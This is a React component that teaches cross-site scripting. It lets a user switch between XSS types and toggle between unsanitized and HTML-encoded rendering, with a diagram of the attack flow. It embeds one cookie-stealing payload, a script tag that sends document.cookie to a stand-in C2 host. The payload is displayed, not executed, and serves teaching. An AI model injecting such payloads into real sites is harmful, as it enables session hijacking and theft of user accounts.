import { useState } from 'react';
import { Code2, ShieldAlert, ShieldCheck } from 'lucide-react';

export function XssViz() {
  const [xssType, setXssType] = useState<'reflected' | 'stored' | 'dom'>('reflected');
  const payload = '<script>fetch("http://c2.local/steal?c=" + document.cookie)</script>';
  const [sanitized, setSanitized] = useState<boolean>(false);

  return (
    <div className="space-y-5 font-mono select-none w-full">
      {/* XSS Type Selector Bar */}
      <div className="flex items-center justify-between gap-2 p-3 rounded-xl bg-[#F7F7F7] dark:bg-[#141414] border border-[#E5E5E5] dark:border-[#2A2A2A]">
        <div className="flex items-center gap-2 overflow-x-auto">
          {(['reflected', 'stored', 'dom'] as const).map((t) => {
            const isActive = xssType === t;
            return (
              <button
                key={t}
                id={`xss-type-${t}`}
                type="button"
                onClick={() => setXssType(t)}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold uppercase transition-all cursor-pointer border ${
                  isActive
                    ? 'bg-[#111111] dark:bg-white text-white dark:text-black border-[#111111] dark:border-white shadow-sm'
                    : 'bg-white dark:bg-[#1C1C1C] text-[#666666] dark:text-[#999999] border-[#E5E5E5] dark:border-[#2A2A2A] hover:border-[#111111] dark:hover:border-white'
                }`}
              >
                {t} XSS
              </button>
            );
          })}
        </div>

        <button
          id="xss-toggle-sanitize"
          type="button"
          onClick={() => setSanitized(!sanitized)}
          className={`px-3 py-1.5 rounded-lg text-xs font-bold uppercase transition-all cursor-pointer border flex items-center gap-1.5 ${
            sanitized
              ? 'bg-emerald-600 text-white border-emerald-600 shadow-sm'
              : 'bg-rose-600 text-white border-rose-600 shadow-sm'
          }`}
        >
          {sanitized ? <ShieldCheck size={14} /> : <ShieldAlert size={14} />}
          {sanitized ? 'HTML ENCODED (SAFE)' : 'UNSANITIZED (EXPLOITABLE)'}
        </button>
      </div>

      {/* SVG DOM Execution Flow Canvas */}
      <div className="relative rounded-2xl border border-[#E5E5E5] dark:border-[#2A2A2A] bg-white dark:bg-[#101010] p-6 flex flex-col justify-between overflow-hidden min-h-[260px] shadow-sm">
        <svg viewBox="0 0 540 220" aria-label="XSS Execution Flow" className="w-full max-h-[260px]">
          {/* Attacker C2 Server */}
          <rect x="20" y="50" width="140" height="75" rx="10" fill="var(--bg-card)" stroke="var(--border-bright)" strokeWidth="2" />
          <text x="90" y="82" textAnchor="middle" fontSize="12" fontFamily="monospace" fill="var(--text-primary)" fontWeight="900">ATTACKER</text>
          <text x="90" y="100" textAnchor="middle" fontSize="10" fontFamily="monospace" fill="var(--text-muted)">Injects Script</text>

          {/* Victim Browser DOM */}
          <rect x="200" y="50" width="140" height="75" rx="10" fill="var(--bg-card)" stroke="var(--border-bright)" strokeWidth="2" />
          <text x="270" y="82" textAnchor="middle" fontSize="12" fontFamily="monospace" fill="var(--text-primary)" fontWeight="900">VICTIM DOM</text>
          <text x="270" y="100" textAnchor="middle" fontSize="10" fontFamily="monospace" fill="var(--text-muted)">
            {sanitized ? '&lt;script&gt; Escaped' : 'Executes JS Payload'}
          </text>

          {/* Exfiltrated Cookie C2 */}
          <rect x="380" y="50" width="140" height="75" rx="10" fill="var(--bg-card)" stroke={sanitized ? 'var(--border)' : 'var(--text-primary)'} strokeWidth="2" />
          <text x="450" y="82" textAnchor="middle" fontSize="12" fontFamily="monospace" fill="var(--text-primary)" fontWeight="900">C2 EXFIL</text>
          <text x="450" y="100" textAnchor="middle" fontSize="10" fontFamily="monospace" fill="var(--text-muted)">
            {sanitized ? 'Blocked by CSP' : 'Cookie Stolen'}
          </text>

          {/* Status Bar */}
          <text x="270" y="180" textAnchor="middle" fontSize="11" fontFamily="monospace" fill={sanitized ? '#10b981' : '#f43f5e'} fontWeight="900">
            {sanitized
              ? '✓ HTML ENTITY ENCODING ENFORCED — SCRIPT TAG RENDERED AS TEXT'
              : '⚠ UNSANITIZED INPUT EXECUTED DOCUMENT.COOKIE IN VICTIM BROWSER'}
          </text>
        </svg>
      </div>

      {/* Code Payload Inspector */}
      <div className="p-5 rounded-xl border border-[#E5E5E5] dark:border-[#2A2A2A] bg-white dark:bg-[#141414] space-y-3 shadow-xs">
        <div className="flex items-center justify-between border-b border-[#E5E5E5] dark:border-[#2A2A2A] pb-3">
          <div className="flex items-center gap-2.5">
            <Code2 size={16} />
            <span className="text-sm font-extrabold uppercase tracking-wide text-[#111111] dark:text-white font-heading">
              DOM RENDERED OUTPUT
            </span>
          </div>
          <span className="text-xs font-bold text-[#888888] dark:text-[#777777] uppercase font-mono">
            TYPE: {xssType.toUpperCase()}
          </span>
        </div>

        <code className="block p-4 rounded-lg bg-[#F7F7F7] dark:bg-[#181818] border border-[#E5E5E5] dark:border-[#2A2A2A] text-xs sm:text-sm font-mono text-[#111111] dark:text-white leading-relaxed font-bold">
          {sanitized
            ? `<div class="comment">&lt;script&gt;fetch(...)&lt;/script&gt;</div>`
            : `<div class="comment">${payload}</div>`}
        </code>
      </div>
    </div>
  );
}
